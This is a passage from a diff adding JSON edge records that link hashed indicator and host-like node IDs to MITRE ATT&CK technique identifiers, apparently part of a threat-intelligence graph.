+      "edge_id": "EDGE_16",
+      "node_u": "HL_d16313ae446a",
+      "node_v": "TTP_T1056"
+    },
+    {
+      "edge_id": "EDGE_17",
+      "node_u": "HL_d16313ae446a",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_18",
+      "node_u": "HL_d16313ae446a",
+      "node_v": "TTP_T1090"
+    },
+    {
+      "edge_id": "EDGE_19",
+      "node_u": "HL_d16313ae446a",
+      "node_v": "TTP_T1102"
+    },
+    {
+      "edge_id": "EDGE_20",
+      "node_u": "HL_d16313ae446a",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_21",
+      "node_u": "HL_d16313ae446a",
+      "node_v": "TTP_T1113"
+    },
+    {
+      "edge_id": "EDGE_22",
+      "node_u": "HL_d16313ae446a",
+      "node_v": "TTP_T1218"
+    },
+    {
+      "edge_id": "EDGE_23",
+      "node_u": "HL_d16313ae446a",
+      "node_v": "TTP_T1566"
+    },
+    {
+      "edge_id": "EDGE_24",
+      "node_u": "IOC_1ef349d06256",
+      "node_v": "TTP_T1218"
+    },
+    {
+      "edge_id": "EDGE_25",
+      "node_u": "IOC_667fdc8a7b35",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_26",
+      "node_u": "IOC_913398352d62",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_27",
+      "node_u": "IOC_913398352d62",
+      "node_v": "TTP_T1090"
+    },
+    {
+      "edge_id": "EDGE_28",
+      "node_u": "IOC_af4568c88da3",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_29",
+      "node_u": "IOC_b8e637be7289",
+      "node_v": "TTP_T1102"
+    },
+    {
+      "edge_id": "EDGE_30",
+      "node_u": "IOC_b8e637be7289",
+      "node_v": "TTP_T1566"
+    },
+    {
+      "edge_id": "EDGE_31",
+      "node_u": "IOC_bbbb37bcc41f",
+      "node_v": "TTP_T1027"
+    },
+    {
+      "edge_id": "EDGE_32",
+      "node_u": "IOC_bbbb37bcc41f",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_33",
+      "node_u": "IOC_c56ed8af1f7b",
+      "node_v": "TTP_T1102"
+    },
+    {
+      "edge_id": "EDGE_34",
+      "node_u": "IOC_c56ed8af1f7b",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_35",
+      "node_u": "IOC_ce84cadd9a72",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_36",
+      "node_u": "IOC_d62e01cb31a7",
+      "node_v": "TTP_T1105"
+    }
+  ]
+}
